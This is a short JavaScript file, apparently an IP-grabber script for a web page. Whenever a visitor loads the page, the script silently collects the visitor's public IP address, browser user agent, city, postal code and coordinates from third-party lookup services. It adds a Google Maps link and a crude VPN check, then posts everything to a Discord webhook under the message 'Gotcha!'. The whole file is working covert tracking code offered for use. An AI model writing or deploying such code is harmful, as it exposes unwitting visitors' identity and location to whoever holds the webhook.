fetch('./config.json')
  .then(function(response) {
    return response.json();
  })
  .then(function(config) {
    const webhook = config.webhook;

    const request = async () => {
      const response = await fetch('https://api.ipify.org/?format=json');
      const data = await response.json();

      const ip = data.ip;

      const userAgent = navigator.userAgent;
      const locationData = await fetch('https://geolocation-db.com/json/');
      const locationResult = await locationData.json();

      // VPN detection algorithm
      let isVPN = false;
      if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
        isVPN = true;
      }

      const latitude = locationResult.latitude;
      const longitude = locationResult.longitude;
      const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

      const message = {
        username: 'By 1onlyremo🦇',
        avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
        embeds: [
          {
            title: 'User Info',
            description: 'Gotcha! Here is the detailed info about the user 👀',
            fields: [
              {
                name: 'IP Address',
                value: ip,
              },
              {
                name: 'User Agent',
                value: userAgent,
              },
              {
                name: 'Location Data',
                value: `Country Code: ${locationResult.country_code}\nCountry Name: ${locationResult.country_name}\nCity: ${locationResult.city}\nPostal: ${locationResult.postal}\nLatitude: ${latitude}\nLongitude: ${longitude}`,
              },
              {
                name: 'Google Maps Link',
                value: `[Click Here](${googleMapsLink})`,
              },
              {
                name: 'VPN Detected',
                value: isVPN ? ':white_check_mark: Yes' : ':x: No',
              },
            ],
            footer: {
              text: 'Made By 1onlyremo#7312',
            },
          },
        ],
      };

      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      })
        .then(() => {
          console.log('Message sent successfully!');
        })
        .catch((error) => {
          console.error('Error while sending the message:', error);
        });
    };

    request();
  });
